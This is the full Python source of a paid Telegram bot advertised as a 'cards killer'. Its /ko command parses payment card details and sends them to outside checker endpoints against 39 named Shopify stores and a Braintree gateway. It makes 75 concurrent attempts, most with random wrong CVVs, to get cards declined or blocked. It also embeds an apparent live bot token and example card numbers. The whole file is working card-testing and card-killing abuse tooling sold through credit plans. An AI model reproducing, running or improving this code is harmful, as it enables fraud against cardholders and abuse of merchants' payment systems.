import asyncio
import random
import logging
import time
import json
import os
import re
import secrets
import aiohttp
from datetime import datetime
from collections import defaultdict

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes

# ================= CONFIG =================
TOKEN = "7679364536:AAHEwAKja_ku1CnmzP7iDlt8em8xSOPhqBE"
OWNER_ID = 7446400377

# Shopify sites (all 38 from your list)
SHOPIFY_SITES = [
    "https://healthyharvest-com.myshopify.com",
    "https://hearing-milestones.myshopify.com",
    "https://equipmentplus.myshopify.com",
    "https://cremo-us.myshopify.com",
    "https://ecs-automotive-concepts.myshopify.com",
    "https://fiercelymeboutique.myshopify.com",
    "https://dsquared-clothing.myshopify.com",
    "https://full-moon-loom.myshopify.com",
    "https://dulcetshop.myshopify.com",
    "https://gorgeous-rx.myshopify.com",
    "https://grafvonfabercastellusa.myshopify.com",
    "https://freedomfiler.myshopify.com",
    "https://dogdogcat.myshopify.com",
    "https://hair-chemist.myshopify.com",
    "https://finchberry.myshopify.com",
    "https://ducloslenses.myshopify.com",
    "https://ecovenger.myshopify.com",
    "https://cy0517.myshopify.com",
    "https://darenmartin-com.myshopify.com",
    "https://d0e086-3.myshopify.com",
    "https://ernest-supplies.myshopify.com",
    "https://colonial-needle-company.myshopify.com",
    "https://goodloops.myshopify.com",
    "https://comfort1shoes.myshopify.com",
    "https://collector-bookstore.myshopify.com",
    "https://greatergoods-com.myshopify.com",
    "https://clenzoilwebsite.myshopify.com",
    "https://hammam-linen.myshopify.com",
    "https://haystacks-brand.myshopify.com",
    "https://ezvacuum-usa.myshopify.com",
    "https://girl-be-brave.myshopify.com",
    "https://cleetusm.myshopify.com",
    "https://decked-test.myshopify.com",
    "https://commit30.myshopify.com",
    "https://cosmedica-skincare-devsite.myshopify.com",
    "https://getondown.myshopify.com",
    "https://danielkraftmann.myshopify.com",
    "https://flannel-candle-co.myshopify.com",
    "https://woofsandmiaus.myshopify.com"
]
SHOPIFY_API_URL = "https://web-production-b4ec9.up.railway.app/shopify"

# Braintree API (only one)
BRAINTREE_API1 = "https://braintree-charged.onrender.com/braintree"

# Concurrency limits
SHOPIFY_CONCURRENCY = 40
BRAINTREE_CONCURRENCY = 2

# Files
DATA_FILE = "user_data.json"
ADMIN_FILE = "admins.json"
CODES_FILE = "codes.json"

PLANS = {
    1: {"days": 1, "credits": 120},
    2: {"days": 7, "credits": 470},
    3: {"days": 15, "credits": 1020},
    4: {"days": 30, "credits": 2500},
}

logging.basicConfig(level=logging.INFO)

# ================= DATA FUNCTIONS =================
def load_json(file):
    if not os.path.exists(file):
        return {}
    with open(file, "r") as f:
        return json.load(f)

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=4)

def get_user_data(user_id):
    data = load_json(DATA_FILE)
    uid = str(user_id)
    if uid not in data:
        return {"credits": 0, "expiry": 0}
    return data[uid]

def set_user_data(user_id, credits, expiry):
    data = load_json(DATA_FILE)
    data[str(user_id)] = {"credits": credits, "expiry": expiry}
    save_json(DATA_FILE, data)

def add_credits(user_id, amount):
    ud = get_user_data(user_id)
    ud["credits"] += amount
    set_user_data(user_id, ud["credits"], ud["expiry"])

def deduct_credits(user_id, amount):
    ud = get_user_data(user_id)
    if ud["credits"] >= amount:
        ud["credits"] -= amount
        set_user_data(user_id, ud["credits"], ud["expiry"])
        return True
    return False

def is_premium(user_id):
    ud = get_user_data(user_id)
    return ud["expiry"] > time.time() or user_id == OWNER_ID

def get_credits(user_id):
    return get_user_data(user_id)["credits"]

def get_expiry_str(user_id):
    exp = get_user_data(user_id)["expiry"]
    if exp == 0:
        return "No active plan"
    if user_id == OWNER_ID:
        return "Lifetime (Owner)"
    return datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S")

def assign_plan(user_id, plan_id):
    plan = PLANS[plan_id]
    new_expiry = time.time() + plan["days"] * 86400
    set_user_data(user_id, plan["credits"], new_expiry)

# ================= ADMIN FUNCTIONS =================
def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    admins = load_json(ADMIN_FILE)
    return str(user_id) in admins

def add_admin(user_id):
    admins = load_json(ADMIN_FILE)
    admins[str(user_id)] = True
    save_json(ADMIN_FILE, admins)

def remove_admin(user_id):
    admins = load_json(ADMIN_FILE)
    if str(user_id) in admins:
        del admins[str(user_id)]
        save_json(ADMIN_FILE, admins)
        return True
    return False

def generate_code(credits):
    code = secrets.token_urlsafe(12)
    codes = load_json(CODES_FILE)
    codes[code] = {"credits": credits, "used": False}
    save_json(CODES_FILE, codes)
    return code

def redeem_code(code, user_id):
    codes = load_json(CODES_FILE)
    if code not in codes or codes[code]["used"]:
        return False, 0
    credits = codes[code]["credits"]
    codes[code]["used"] = True
    save_json(CODES_FILE, codes)
    add_credits(user_id, credits)
    return True, credits

# ================= API CALLS WITH CONCURRENCY =================
async def report_error_to_owner(context, api_name, error_msg, card_str=""):
    if OWNER_ID:
        await context.bot.send_message(
            OWNER_ID,
            f"⚠️ *API Error Report*\nAPI: `{api_name}`\nCard: `{card_str}`\nError: `{error_msg[:200]}`",
            parse_mode=ParseMode.MARKDOWN
        )

async def check_shopify(card_str, use_wrong_cvv=False, wrong_cvv=None, context=None):
    original = card_str
    if use_wrong_cvv and wrong_cvv:
        parts = card_str.split('|')
        if len(parts) == 4:
            parts[3] = str(wrong_cvv)
            card_str = '|'.join(parts)
    # Randomly pick a Shopify site for this request
    site = random.choice(SHOPIFY_SITES)
    url = f"{SHOPIFY_API_URL}?site={site}&cc={card_str}"
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(url, timeout=15) as resp:
                try:
                    data = await resp.json()
                    resp_text = data.get('response') or data.get('status') or str(data)
                except:
                    resp_text = await resp.text()
                is_dead = "CARD_DECLINED" in resp_text
                return is_dead, resp_text
    except Exception as e:
        if context:
            await report_error_to_owner(context, f"Shopify API (wrong_cvv={use_wrong_cvv})", str(e), original)
        return False, f"Error: {str(e)[:50]}"

async def check_braintree(card_str, context=None):
    url = f"{BRAINTREE_API1}?cc={card_str}"
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(url, timeout=15) as resp:
                try:
                    data = await resp.json()
                    resp_text = str(data)
                except:
                    resp_text = await resp.text()
                lower = resp_text.lower()
                is_dead = any(x in lower for x in ["declined", "invalid", "do not honor", "pick up", "lost", "stolen", "card_declined"])
                return is_dead, resp_text
    except Exception as e:
        if context:
            await report_error_to_owner(context, f"Braintree API", str(e), card_str)
        return False, f"Error: {str(e)[:50]}"

# ================= KILL SEQUENCE WITH CONCURRENT WORKERS =================
async def run_concurrent(checks, concurrency, context):
    """Run list of async checks with limited concurrency."""
    sem = asyncio.Semaphore(concurrency)
    async def bounded_check(check_func, *args):
        async with sem:
            return await check_func(*args, context=context)
    tasks = [bounded_check(func, *args) for func, args in checks]
    return await asyncio.gather(*tasks)

async def perform_full_kill(card_str, original_cvv, context):
    start_time = time.time()
    any_dead = False
    last_shopify_resp = ""
    last_braintree_resp = ""

    # 1. 20 wrong‑CVV Shopify checks (concurrent)
    wrong_cvv_tasks = []
    for _ in range(20):
        wrong_cvv = random.randint(1, 999)
        while wrong_cvv == int(original_cvv):
            wrong_cvv = random.randint(1, 999)
        wrong_cvv_tasks.append((check_shopify, card_str, True, wrong_cvv))
    results = await run_concurrent(wrong_cvv_tasks, SHOPIFY_CONCURRENCY, context)
    for dead, resp in results:
        last_shopify_resp = resp
        if dead:
            any_dead = True
    # No early stop – always complete all attempts

    # 2. 40 correct‑CVV Shopify checks (concurrent)
    correct_tasks = [(check_shopify, card_str, False, None) for _ in range(40)]
    results = await run_concurrent(correct_tasks, SHOPIFY_CONCURRENCY, context)
    for dead, resp in results:
        last_shopify_resp = resp
        if dead:
            any_dead = True

    # 3. 15 Braintree checks (concurrent, limit 2)
    bt_tasks = [(check_braintree, card_str) for _ in range(15)]
    results = await run_concurrent(bt_tasks, BRAINTREE_CONCURRENCY, context)
    for dead, resp in results:
        last_braintree_resp = resp
        if dead:
            any_dead = True

    total_time = time.time() - start_time
    total_attempts = 20 + 40 + 15  # 75 total attempts
    return any_dead, total_attempts, last_shopify_resp, last_braintree_resp, total_time

# ================= PARSE CARD FROM FREE TEXT =================
def extract_card_details(text):
    text = text.replace('\n', ' ').replace(',', ' ')
    # Support both pipe and space separation, also free text
    # First try direct pipe format
    if '|' in text:
        parts = text.split('|')
        if len(parts) >= 4:
            cc = parts[0].strip()
            month = parts[1].strip().zfill(2)
            year_raw = parts[2].strip()
            cvv = parts[3].strip()
            if len(year_raw) == 2:
                year = '20' + year_raw
            else:
                year = year_raw
            if cc.isdigit() and month.isdigit() and year.isdigit() and cvv.isdigit():
                return cc, month, year, cvv
    # Otherwise regex extraction
    card_match = re.search(r'\b(?:card\s*(?:number|no|#)?\s*:?\s*)?(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})\b', text, re.I)
    if card_match:
        cc = re.sub(r'[\s-]', '', card_match.group(1))
    else:
        card_match = re.search(r'\b(\d{15,16})\b', text)
        if not card_match:
            return None
        cc = card_match.group(1)
    cvv_match = re.search(r'\b(?:cvv|cvc|cvv2|security\s*code)\s*:?\s*(\d{3,4})\b', text, re.I)
    if not cvv_match:
        cvv_match = re.search(r'\b(\d{3,4})\b', text)
    if not cvv_match:
        return None
    cvv = cvv_match.group(1)
    exp_match = re.search(r'\b(?:exp|expiry|expiration|valid thru?)\s*:?\s*(\d{1,2})[/.-](\d{2,4})\b', text, re.I)
    if not exp_match:
        exp_match = re.search(r'\b(\d{1,2})[/.-](\d{2,4})\b', text)
    if not exp_match:
        exp_match = re.search(r'\b(?:jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)[a-z]*\s+(\d{2,4})\b', text, re.I)
        if exp_match:
            month_map = {'jan':1,'feb':2,'mar':3,'apr':4,'may':5,'jun':6,'jul':7,'aug':8,'sep':9,'oct':10,'nov':11,'dec':12}
            month_str = re.search(r'(jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)', text, re.I).group(1).lower()
            month = str(month_map[month_str]).zfill(2)
            year = exp_match.group(1)
            if len(year) == 2:
                year = '20' + year
            return cc, month, year, cvv
    if not exp_match:
        return None
    month = exp_match.group(1).zfill(2)
    year = exp_match.group(2)
    if len(year) == 2:
        year = '20' + year
    return cc, month, year, cvv

# ================= TELEGRAM COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_credits(user_id)
    expiry_str = get_expiry_str(user_id)
    plan_text = "Active" if is_premium(user_id) else "Expired/Free"
    text = (
        f"[⌬] COMMAND LIST\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] Yᴏᴜʀ Cʀᴇᴅɪᴛs: `{credits}`\n"
        f"[⌬] Yᴏᴜʀ Pʟᴀɴ: {plan_text}\n"
        f"[⌬] Expires: `{expiry_str}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] PREMIUM COMMANDS\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] CARDS KILLER (5 ᴄʀᴇᴅɪᴛs/ᴜsᴇ)\n"
        f"────────────────────\n"
        f"/ko     - Kɪʟʟᴇʀ - Fᴀsᴛ Vᴇʀsɪᴏɴ [✅ ON]\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Use `/redeem <code>` to add credits.\n"
        f"Admin commands: `/key`, `/addadmin`, `/removeadmin`, `/plan`\n"
        f"View plans: `/plan`"
    )
    if user_id == OWNER_ID:
        text += "\n\n👑 *Owner powers active* – you receive error reports."
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def plan_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"[⌤] Plan 1 (1 Day)\n"
        f"   [⌥] Days: 1\n"
        f"   [⌥] Credits: 120\n"
        f"   [↯] Price: Contact admin\n\n"
        f"[⌤] Plan 2 (7 Days)\n"
        f"   [⌥] Days: 7\n"
        f"   [⌥] Credits: 470\n"
        f"   [↯] Price: Contact admin\n\n"
        f"[⌤] Plan 3 (15 Days)\n"
        f"   [⌥] Days: 15\n"
        f"   [⌥] Credits: 1020\n"
        f"   [↯] Price: Contact admin\n\n"
        f"[⌤] Plan 4 (30 Days)\n"
        f"   [⌥] Days: 30\n"
        f"   [⌥] Credits: 2500\n"
        f"   [↯] Price: Contact admin\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"[↯] To purchase a plan, contact the admin.\n"
        f"[⌥] Use `/redeem code` to redeem plan codes\n"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_credits(user_id)
    if credits < 5:
        await update.message.reply_text(
            "❌ *Insufficient credits!* You need 5 credits per kill.\n"
            "Redeem a code with `/redeem <code>` or buy a plan via `/plan`.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    full_text = update.message.text
    if full_text.startswith('/ko'):
        full_text = full_text[3:].strip()
    elif full_text.startswith('/Ko'):
        full_text = full_text[3:].strip()
    else:
        full_text = ' '.join(context.args) if context.args else ""

    if not full_text:
        await update.message.reply_text(
            "❌ Usage: `/ko <card details in any format>`\n"
            "Examples:\n"
            "`/ko 4147400394606212|520|07|2028`\n"
            "`/ko Card Number: 4147400394606212 CVV: 520 Expiry: 07/2028`\n"
            "`/ko 4403934251160201 517 01 2027`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    extracted = extract_card_details(full_text)
    if not extracted:
        await update.message.reply_text(
            "❌ Could not extract card details. Please provide at least:\n"
            "- Card number (16 digits)\n"
            "- CVV (3-4 digits)\n"
            "- Expiry (MM/YY or MM/YYYY)",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    card, month, year, cvv = extracted
    card_str = f"{card}|{month}|{year}|{cvv}"

    processing = await update.message.reply_text("𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴… ⏳\n(75 attempts – concurrent, please wait)", parse_mode=ParseMode.MARKDOWN)

    killed, attempts, shopify_resp, braintree_resp, elapsed = await perform_full_kill(card_str, cvv, context)

    if killed:
        deduct_credits(user_id, 5)
        new_balance = get_credits(user_id)
        result_text = (
            f"┏━━━━━━━⍟\n"
            f"┃ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈 \n"
            f"┗━━━━━━━━━━━⊛\n\n"
            f"[⌬] Cᴀʀᴅ↬ `{card_str}`\n"
            f"[⌬] Gᴀᴛᴇᴡᴀʏ↬ Kɪʟʟᴇʀ \n"
            f"[⌬] Rᴇsᴘᴏɴsᴇ↬ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈\n"
            f"[⌬] Pʀᴏᴄᴇssᴇᴅ↬ {attempts} Tɪᴍᴇs \n"
            f"[⌬] Tɪᴍᴇ Tᴀᴋᴇɴ↣ {elapsed:.2f} Sᴇᴄᴏɴᴅs\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"[⌬] Rᴇǫᴜᴇsᴛ Bʏ↬ {update.effective_user.first_name}\n"
            f"[⌬] Bᴏᴛ Bʏ↬ ༒ 𝑺𝒕𝒐𝒓𝒎𝒀𝑻 ༒\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• Cʀᴇᴅɪᴛs Dᴇᴅᴜᴄᴛᴇᴅ - 5 | Bᴀʟᴀɴᴄᴇ - {new_balance}"
        )
    else:
        result_text = (
            f"❌ *Kill failed!* No dead response from any gateway.\n"
            f"Processed: {attempts} Times | Time: {elapsed:.2f}s\n"
            f"Last Shopify: `{shopify_resp[:80]}`\n"
            f"Last Braintree: `{braintree_resp[:80]}`\n"
            f"*No credits deducted.*"
        )
    await processing.delete()
    await update.message.reply_text(result_text, parse_mode=ParseMode.MARKDOWN)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/redeem <code>`", parse_mode=ParseMode.MARKDOWN)
        return
    code = args[0]
    success, credits = redeem_code(code, user_id)
    if success:
        await update.message.reply_text(f"✅ Redeemed! You received `{credits}` credits.", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("❌ Invalid or already used code.", parse_mode=ParseMode.MARKDOWN)

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only.", parse_mode=ParseMode.MARKDOWN)
        return
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("Usage: `/key <quantity> <credits>`\nExample: `/key 5 100`", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        quantity = int(args[0])
        credits_val = int(args[1])
        if quantity <= 0 or credits_val <= 0:
            raise ValueError
    except:
        await update.message.reply_text("Invalid numbers.", parse_mode=ParseMode.MARKDOWN)
        return
    codes = [generate_code(credits_val) for _ in range(quantity)]
    await update.message.reply_text(f"✅ Generated {quantity} code(s) worth {credits_val} credits each:\n`" + "\n".join(codes) + "`", parse_mode=ParseMode.MARKDOWN)

async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/addadmin <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        target = int(args[0])
    except:
        await update.message.reply_text("Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
        return
    add_admin(target)
    await update.message.reply_text(f"✅ User `{target}` is now an admin.", parse_mode=ParseMode.MARKDOWN)

async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/removeadmin <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        target = int(args[0])
    except:
        await update.message.reply_text("Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
        return
    if remove_admin(target):
        await update.message.reply_text(f"✅ User `{target}` is no longer an admin.", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(f"❌ User `{target}` was not an admin.", parse_mode=ParseMode.MARKDOWN)

async def plan_assign(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only.", parse_mode=ParseMode.MARKDOWN)
        return
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("Usage: `/plan <plan_id> <user_id>`\nPlan IDs: 1,2,3,4", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        plan_id = int(args[0])
        target = int(args[1])
        if plan_id not in PLANS:
            raise ValueError
    except:
        await update.message.reply_text("Invalid plan ID (1-4) or user ID.", parse_mode=ParseMode.MARKDOWN)
        return
    assign_plan(target, plan_id)
    plan = PLANS[plan_id]
    await update.message.reply_text(
        f"✅ Plan {plan_id} assigned to user `{target}`.\n"
        f"Days: {plan['days']} | Credits: {plan['credits']}",
        parse_mode=ParseMode.MARKDOWN
    )

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("plan", plan_menu))
    app.add_handler(CommandHandler("ko", kill))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("key", key_command))
    app.add_handler(CommandHandler("addadmin", addadmin))
    app.add_handler(CommandHandler("removeadmin", removeadmin))
    app.add_handler(CommandHandler("plan", plan_assign))
    print("🔥 Fast concurrent killer bot is running (75 attempts, 40 Shopify workers, 2 Braintree workers)...")
    print(f"👑 Owner ID: {OWNER_ID}")
    app.run_polling()

if __name__ == "__main__":
    main()
